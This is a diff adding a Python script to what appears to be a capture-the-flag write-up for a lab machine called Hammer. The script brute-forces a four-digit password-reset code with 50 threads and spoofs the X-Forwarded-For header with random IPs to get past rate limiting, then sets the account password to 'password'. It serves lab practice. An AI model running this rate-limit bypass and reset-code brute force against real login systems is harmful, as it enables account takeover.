@@ -49,6 +49,115 @@ now we can try to enter the email in the “Forgot Password” field.  i also no
 i try to brutforce but their is rate limiting. so now we need to bypass the rate limiting.  i crafter a python code which brutforce the ip address and the find the 4 digit code and reset password to password.
 
 ```
+#!/usr/bin/env python3
+
+import requests
+import random
+import threading
+
+
+# =======================
+# Configuration
+# =======================
+
+URL = "http://10.48.154.110:1337/reset_password.php"
+EMAIL = "tester@hammer.thm"
+NUM_THREADS = 50
+CODE_RANGE = 10000
+
+stop_flag = threading.Event()
+
+
+# =======================
+# Helper Functions
+# =======================
+
+def generate_fake_ip():
+    """Generate random IP for X-Forwarded-For header."""
+    return f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
+
+
+def send_new_password(session):
+    """Send password change request after successful OTP."""
+    new_password = "password"
+
+    session.post(
+        URL,
+        data={
+            "new_password": new_password,
+            "confirm_password": new_password,
+        },
+        headers={
+            "X-Forwarded-For": generate_fake_ip()
+        },
+    )
+
+    print(f"[+] Password is set to: {new_password}")
+
+def brute_force_code(session, start, end):
+    for code in range(start, end):
+
+        if stop_flag.is_set():
+            return
+
+        code_str = f"{code:04d}"
+
+        try:
+            response = session.post(
+                URL,
+                data={
+                    "recovery_code": code_str,
+                    "s": "180"
+                },
+                headers={
+                    "X-Forwarded-For": generate_fake_ip()
+                },
+                allow_redirects=False,
+            )
+
+            # Success condition
+            if (
+                response.status_code != 302
+                and "Invalid or expired recovery code!" not in response.text
+                and "new_password" in response.text
+            ):
+                stop_flag.set()
+                print(f"[+] Found recovery code: {code_str}")
+                send_new_password(session)
+                return
+
+        except Exception:
+            continue
+
+def main():
+    session = requests.Session()
+
+    print("[+] Sending initial password reset request...")
+    session.post(URL, data={"email": EMAIL})
+
+    print("[+] Starting brute-force process...")
+
+    step = CODE_RANGE // NUM_THREADS
+    threads = []
+
+    for i in range(NUM_THREADS):
+        start = i * step
+        end = start + step
+
+        thread = threading.Thread(
+            target=brute_force_code,
+            args=(session, start, end)
+        )
+
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+
+if __name__ == "__main__":
+    main()
 
 ```
 
